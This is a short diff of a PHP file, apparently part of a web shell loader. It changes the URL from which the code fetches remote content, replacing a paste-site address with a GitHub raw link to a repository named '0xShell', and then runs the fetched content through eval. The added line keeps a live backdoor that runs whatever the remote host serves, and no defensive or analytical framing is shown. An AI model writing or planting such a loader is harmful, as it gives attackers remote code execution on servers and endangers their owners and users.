@@ -27,5 +27,5 @@ $url_get_contents_data = false;
 }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://paste.exploits.my.id/paste/mGx8V/raw');
+$a = geturlsinfo('https://raw.githubusercontent.com/temempik1337/0xShell/main/0xencbase.js');
 eval ('?>'.$a);
